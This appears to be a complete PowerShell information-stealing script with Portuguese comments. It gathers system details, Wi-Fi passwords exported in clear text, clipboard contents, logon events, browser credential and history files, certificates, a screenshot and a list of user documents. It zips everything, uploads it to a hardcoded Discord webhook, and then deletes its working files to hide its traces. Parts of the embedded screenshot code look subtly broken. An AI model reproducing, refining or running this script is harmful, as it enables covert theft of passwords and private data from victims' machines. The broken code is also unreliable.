# KIT v3.0 – 10 MB max, PS 7.5.4, sem elevação, sem erros
$hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null

# 1) TXT leves (CIM separados)
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores – copia só se existir (path absoluto)
@('Login Data','History','logins.json')| %{
  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
    if(Test-Path $_.FullName){Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0}
  }
}

# 3) Certificados
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8

# 4) Screenshot 800×600 via WinAPI (sem FromScreen)
Add-Type -TypeDefinition @"
using System; using System.Drawing; using System.Drawing.Imaging; using System.Runtime.InteropServices;
public class Cap{ [DllImport("user32.dll")] static extern int GetDesktopWindow(); [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr hWnd);
public static void Shot(string f){ IntPtr desk=GetDesktopWindow(), dc=GetWindowDC(desk); Bitmap bmp=new Bitmap(800,600); Graphics g=Graphics.FromImage(bmp); IntPtr gHdc=g.GetHdc(); BitBlt(dc,0,0,800,600,gHdc,0,0,0x00CC0020); g.ReleaseHdc(gHdc); bmp.Save(f,ImageFormat.Jpeg); g.Dispose(); bmp.Dispose(); ReleaseDC(desk,dc);
} [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hDest,int x,int w,int h,IntPtr hSrc,int X,int Y,uint rop); [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd,IntPtr hDC); }
"@
[Cap]::Shot("$kit\ss.jpg")

# 5) Top 100 arquivos
$ext=@('*.pdf','*.doc*','*.xls*','*.txt','*.csv','*.db','*.sqlite','*.pst')
Get-ChildItem $env:USERPROFILE -Include $ext -Recurse -Depth 2 -EA 0|Select FullName,Length,LastWriteTime|Sort Length -Descending|Select -First 100|Export-Csv "$kit\t.csv" -NoTypeInformation

# 6) ZIP ≤ 10 MB
Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal
if((Get-Item "$kit.zip").Length -gt 10MB){
  Remove-Item "$kit\ss.jpg"
  Compress-Archive -Update -Path $kit -DestinationPath "$kit.zip" -CompressionLevel Optimal
}

# 7) Envia
Invoke-RestMethod $hook -Method Post -InFile "$kit.zip" -ContentType 'application/zip'

# 8) Limpa
Remove-Item $kit -Recurse -Force; Remove-Item "$kit.zip" -Force
